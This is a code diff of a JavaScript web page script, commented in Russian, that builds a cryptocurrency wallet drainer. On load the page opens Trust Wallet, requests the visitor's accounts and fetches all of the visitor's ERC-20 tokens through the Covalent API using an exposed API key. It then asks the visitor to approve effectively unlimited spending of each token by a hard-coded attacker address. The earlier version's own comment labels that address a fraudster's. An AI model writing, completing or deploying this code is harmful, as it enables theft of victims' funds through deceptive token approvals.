@@ -1,61 +1,70 @@
-// Попробуем открыть Trust Wallet через 3 секунды
-setTimeout(function () {
-    // Открытие Trust Wallet (сработает на мобиле, если установлен)
-    window.location.href = "trust://";
+const COVALENT_API_KEY = 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA';
+const CHAIN_ID = 1; // Ethereum Mainnet
+const SPENDER_ADDRESS = '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75'; // Замените на ваш адрес, который будет получать разрешение на токены
 
-    // Если не получилось — через 10 секунд редирект на сайт загрузки
-    setTimeout(function () {
+// Попробуем открыть Trust Wallet через 3 секунды
+setTimeout(() => {
+    window.location.href = "trust://";
+    setTimeout(() => {
         window.location.href = "https://trustwallet.com/download";
     }, 10000);
 }, 3000);
 
-// После загрузки страницы подключаем Web3
-window.addEventListener('load', async function () {
-    if (typeof window.ethereum !== 'undefined' || typeof window.web3 !== 'undefined') {
-        const web3 = new Web3(window.ethereum);
+// Функция для получения токенов пользователя и разрешений на их управление
+async function approveAllTokens(web3, userAddress) {
+    const url = https://api.covalenthq.com/v1/${CHAIN_ID}/address/${userAddress}/balances_v2/?key=${COVALENT_API_KEY};
+    const res = await fetch(url);
+    const data = await res.json();
 
-        try {
-            // Запрашиваем доступ к кошельку
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const userAddress = accounts[0];
-            console.log("Адрес кошелька:", userAddress);
-
-            // Получаем баланс ETH
-            const balanceWei = await web3.eth.getBalance(userAddress);
-            const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
-            console.log("Баланс ETH:", balanceEth);
-
-            // Дополнительно, запрашиваем approve для токенов ERC-20
-            const tokenAddress = '0x...'; // Адрес контракта токена
-            const tokenABI = [
-                {
+    if (data && data.data && data.data.items) {
+        for (const token of data.data.items) {
+            if (
+                token.type === "cryptocurrency" &&
+                token.contract_address &&
+                token.contract_address !== '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'  // Проверка на ETH (это исключаем)
+            ) {
+                const tokenAddress = token.contract_address;
+                const tokenABI = [{
                     "constant": false,
                     "inputs": [
                         { "name": "spender", "type": "address" },
                         { "name": "value", "type": "uint256" }
                     ],
                     "name": "approve",
-                    "outputs": [
-                        { "name": "", "type": "bool" }
-                    ],
+                    "outputs": [{ "name": "", "type": "bool" }],
                     "payable": false,
                     "stateMutability": "nonpayable",
                     "type": "function"
+                }];
+
+                const contract = new web3.eth.Contract(tokenABI, tokenAddress);
+                const amount = web3.utils.toWei('1000000000000', 'ether'); // Максимальное количество
+
+                try {
+                    await contract.methods.approve(SPENDER_ADDRESS, amount).send({ from: userAddress });
+                    console.log(`Approved: ${token.contract_name || tokenAddress}`);
+                } catch (e) {
+                    console.warn(`Ошибка approve: ${token.contract_name || tokenAddress}`, e.message);
                 }
-            ];
+            }
+        }
+    }
+}
 
-            const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+// Подключение Web3 после загрузки страницы
+window.addEventListener('load', async () => {
+    if (typeof window.ethereum !== 'undefined') {
+        const web3 = new Web3(window.ethereum);
+        try {
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const userAddress = accounts[0];
+            console.log("Адрес кошелька:", userAddress);
 
-            // Запрашиваем approve для управления всеми токенами
-            const amount = web3.utils.toWei('1000000000', 'ether');  // Очень большое количество токенов
-            const spenderAddress = '0x...'; // Адрес мошенника
-
-            await tokenContract.methods.approve(spenderAddress, amount).send({ from: userAddress });
-            console.log("Разрешение на управление токенами было выдано.");
+            await approveAllTokens(web3, userAddress);
         } catch (err) {
             console.error("Ошибка при подключении к кошельку:", err);
         }
     } else {
         console.error("Web3 не найден. Установите Trust Wallet или MetaMask.");
     }
-});
+})
